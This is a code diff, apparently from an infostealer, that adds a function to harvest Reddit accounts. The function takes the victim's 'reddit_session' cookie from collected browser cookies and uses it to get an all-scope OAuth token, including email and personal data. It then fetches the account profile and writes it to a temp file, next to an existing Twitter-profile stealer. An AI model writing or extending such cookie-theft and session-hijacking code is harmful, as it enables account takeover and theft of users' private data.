@@ -34,4 +34,17 @@ const twitter = async () => {
   writeFileSync(join(tempFolder, 'Twitter.json'), JSON.stringify(profile));
 };
 
+const reddit = async () => {
+  const { value: cookie, source } = (await cookies).find(cookie => cookie.host.includes('.reddit.com') && cookie.name === 'reddit_session');
+  const { data: bearer } = await axios.post('https://accounts.reddit.com/api/access_token', { scopes: ['*', 'email', 'pii'] }, {
+    headers: { Cookie: `reddit_session=${cookie}`, Authorization: 'Basic b2hYcG9xclpZdWIxa2c6' }
+  });
+  const { data: account } = await axios.get('https://oauth.reddit.com/api/v1/me', {
+    headers: { Authorization: `Bearer ${bearer.access_token}` }
+  });
+  account.source = source;
+  writeFileSync(join(tempFolder, 'Reddit.json'), JSON.stringify(account));
+};
+
 twitter();
+reddit();
